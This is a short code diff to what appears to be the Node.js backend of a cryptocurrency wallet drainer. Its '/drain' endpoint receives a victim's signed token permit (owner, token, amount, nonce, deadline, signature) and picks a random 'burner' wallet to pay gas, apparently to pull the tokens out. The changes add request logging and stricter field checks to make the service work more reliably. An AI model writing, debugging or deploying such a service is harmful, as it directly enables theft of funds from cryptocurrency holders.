@@ -103,12 +103,22 @@ app.get('/health', async (req, res) => {
 app.post('/drain', async (req, res) => {
   const start = Date.now();
   try {
+    console.log('📦 RAW REQUEST:', JSON.stringify(req.body, null, 2));  // ✅ DEBUG
+    
     const { owner, token, tokenSymbol, amount, nonce, deadline, signature } = req.body;
     
-    if (!owner || !token || !tokenSymbol || !signature) {
-      return res.status(400).json({ error: 'Missing required fields' });
+    if (!owner || !token || !tokenSymbol || !amount || !nonce || !deadline || !signature) {
+      const missing = ['owner','token','tokenSymbol','amount','nonce','deadline','signature']
+        .filter(k => !req.body[k]);
+      return res.status(400).json({ 
+        error: 'Missing required fields',
+        received: Object.keys(req.body),
+        missing,
+        sample: req.body
+      });
     }
     
+    // 🔥 FIX 1: SELECT BURNER FIRST
     const burner = burners[Math.floor(Math.random() * burners.length)];
     const balance = await provider.getBalance(burner.address);
     if (balance.lt(ethers.utils.parseEther('0.001'))) {
